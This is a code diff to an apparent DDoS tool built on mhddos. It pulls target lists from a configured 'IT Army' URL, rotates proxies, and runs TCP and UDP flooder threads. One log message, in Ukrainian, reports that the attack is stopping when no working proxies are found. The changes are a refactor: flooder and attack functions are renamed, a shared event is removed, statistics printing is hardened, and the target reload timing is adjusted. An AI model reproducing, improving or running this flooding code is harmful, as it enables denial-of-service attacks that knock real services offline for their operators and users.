@@ -5,7 +5,6 @@ from contextlib import suppress
 import colorama; colorama.init()
 # @formatter:on
 from itertools import cycle
-from queue import SimpleQueue
 import random
 import time
 from threading import Event, Thread
@@ -13,11 +12,9 @@ from typing import Any, Generator, Iterator, List, Optional
 
 from src.cli import init_argparse
 from src.concurrency import DaemonThreadPool
-from src.core import (
-    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED, Params, Stats
-)
+from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, Params, Stats
 from src.dns_utils import resolve_all_targets
-from src.mhddos import main as mhddos_main, async_main as mhddos_async_main
+from src.mhddos import async_main as mhddos_async_main
 from src.output import show_statistic, print_banner, print_progress
 from src.proxies import ProxySet
 from src.system import fix_ulimits, is_latest_version
@@ -26,7 +23,7 @@ from src.targets import TargetsLoader
 
 # XXX: having everything on the same thread means that we can create
 #      priority queue for target (decreasing priority for "dead" targets)
-class AsyncFlooder:
+class Flooder:
 
     def __init__(self, switch_after: int = 100):
         self._switch_after = switch_after
@@ -54,7 +51,7 @@ class AsyncFlooder:
 
 
 # XXX: UDP
-async def run_async_ddos(
+async def run_ddos(
     proxies: Optional[ProxySet],
     targets_loader,
     reload_after,
@@ -67,7 +64,7 @@ async def run_async_ddos(
     udp_threads,
     switch_after,
 ):
-    statistics, event = {}, Event()
+    statistics = {}
 
     # initial set of proxies
     if proxies is not None:
@@ -75,7 +72,6 @@ async def run_async_ddos(
         if num_proxies == 0:
             logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
             exit()
-
 
     def register_params(params, container):
         thread_statistics = Stats()
@@ -85,7 +81,7 @@ async def run_async_ddos(
             'ip': params.target.addr,
             'method': params.method,
             'rpc': int(params.target.option("rpc", "0")) or rpc,
-            'event': event,
+            'event': None,
             'stats': thread_statistics,
             'proxies': proxies,
         }
@@ -101,8 +97,8 @@ async def run_async_ddos(
         # Keep the docs/info on-screen for some time before outputting the logger.info above
         await asyncio.sleep(5)
 
-    flooders = [AsyncFlooder(switch_after) for _ in range(total_threads)]
-    udp_flooders = [AsyncFlooder(switch_after) for _ in range(udp_threads)]
+    flooders = [Flooder(switch_after) for _ in range(total_threads)]
+    udp_flooders = [Flooder(switch_after) for _ in range(udp_threads)]
 
     # XXX: might throw an exception
     async def load_targets():
@@ -153,19 +149,22 @@ async def run_async_ddos(
         refresh_rate = 5
         ts = time.time()
         while True:
+            try:
+                passed = time.time() - ts
+                ts = time.time()
+                num_proxies = 0 if proxies is None else len(proxies)
+                show_statistic(
+                    statistics,
+                    refresh_rate,
+                    table,
+                    vpn_mode,
+                    num_proxies,
+                    reload_after,
+                    passed
+                )
+            except Exception:
+                ts = time.time()
             await asyncio.sleep(refresh_rate)
-            passed = time.time() - ts
-            ts = time.time()
-            num_proxies = 0 if proxies is None else len(proxies)
-            show_statistic(
-                statistics,
-                refresh_rate,
-                table,
-                vpn_mode,
-                num_proxies,
-                reload_after,
-                passed
-            )
 
     # setup coroutine to print stats
     tasks.append(asyncio.ensure_future(stats_printer()))
@@ -193,7 +192,7 @@ async def run_async_ddos(
                 pass
   
     # setup coroutine to reload targets
-    tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=5)))
+    tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=reload_after)))
 
     async def reload_proxies(delay_seconds: int = 30):
         while True:
@@ -251,7 +250,6 @@ async def start(args, shutdown_event: Event):
     else:
         targets_loader = TargetsLoader(args.targets, args.config)
 
-    # XXX: periodic updates
     # XXX: fix for UDP targets
     no_proxies = args.vpn_mode # or all(target.is_udp for target in targets)
     proxies = None if no_proxies else ProxySet(args.proxies)
@@ -259,7 +257,7 @@ async def start(args, shutdown_event: Event):
     # XXX: with the current implementation there's no need to
     # have 2 separate functions to setups params for launching flooders
     reload_after = 300
-    await run_async_ddos(
+    await run_ddos(
         proxies,
         targets_loader,
         reload_after,
